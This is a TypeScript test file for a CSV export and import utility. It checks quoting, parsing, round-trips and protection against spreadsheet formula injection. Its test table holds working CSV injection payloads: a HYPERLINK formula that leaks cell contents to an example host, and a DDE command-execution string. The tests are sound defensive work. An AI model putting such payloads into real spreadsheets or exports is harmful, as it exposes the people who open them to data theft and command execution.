import { buildCsvContent, importCsvFile, parseCsvRows, type Tab } from "#utils/export.ts";

const header = [
    { label: "Name", property: "name" },
    { label: "Description", property: "description" },
];

function tabWith(items: object[]): Tab {
    return { name: "catalog_threats.csv", header, items };
}

describe("buildCsvContent", () => {
    it("quotes every cell and starts each tab with a Tab line", () => {
        expect(buildCsvContent([tabWith([{ name: "Phishing", description: "Fake login page" }])])).toBe(
            'Tab:catalog_threats.csv\n"Name";"Description"\n"Phishing";"Fake login page"\n'
        );
    });

    it("keeps delimiters, quotes and line breaks inside a cell", () => {
        const content = buildCsvContent([tabWith([{ name: 'Split;"quoted"', description: "first\nTab:forged" }])]);

        expect(content).toBe('Tab:catalog_threats.csv\n"Name";"Description"\n"Split;""quoted""";"first\nTab:forged"\n');
    });

    it.each([
        ['=HYPERLINK("http://example.com/?leak="&B3;"click")'],
        ["+cmd|' /C calc'!A0"],
        ["-2+3"],
        ["@SUM(1,2)"],
        ["\t=1+1"],
        ["\r=1+1"],
    ])("prefixes %j with an apostrophe so spreadsheets do not run it", (value) => {
        const content = buildCsvContent([tabWith([{ name: value, description: "" }])]);

        expect(content).toContain(`"'${value.replace(/"/g, '""')}"`);
    });

    it("leaves values without a formula prefix unchanged", () => {
        const content = buildCsvContent([tabWith([{ name: "a=b", description: "x-y" }])]);

        expect(content).toContain('"a=b";"x-y"');
    });
});

describe("parseCsvRows", () => {
    it("restores the values written by buildCsvContent", () => {
        const items = [
            { name: '=HYPERLINK("http://example.com")', description: "line one\nline two" },
            { name: 'Split;"quoted"', description: "-bullet" },
        ];

        const rows = parseCsvRows(buildCsvContent([tabWith(items)]));

        expect(rows).toEqual([
            ["Tab:catalog_threats.csv"],
            ["Name", "Description"],
            ['=HYPERLINK("http://example.com")', "line one\nline two"],
            ['Split;"quoted"', "-bullet"],
        ]);
    });

    it("reads unquoted cells, \\r\\n line endings and skips empty lines", () => {
        expect(parseCsvRows("Name;Description\r\nPhishing;Fake login page\r\n\r\n")).toEqual([
            ["Name", "Description"],
            ["Phishing", "Fake login page"],
        ]);
    });

    it("returns no rows for empty content", () => {
        expect(parseCsvRows("")).toEqual([]);
    });
});

describe("importCsvFile", () => {
    it("imports a file written by the csv export", async () => {
        const items = [{ name: "=1+1", description: 'Uses ";" and\nline breaks' }];
        const file = new File([buildCsvContent([tabWith(items)])], "export.csv", { type: "text/csv" });

        const result = await importCsvFile(file, (row) => ({ name: row[0], description: row[1] }), vi.fn());

        expect(result).toEqual({ header: ["Name", "Description"], rows: items });
    });
});
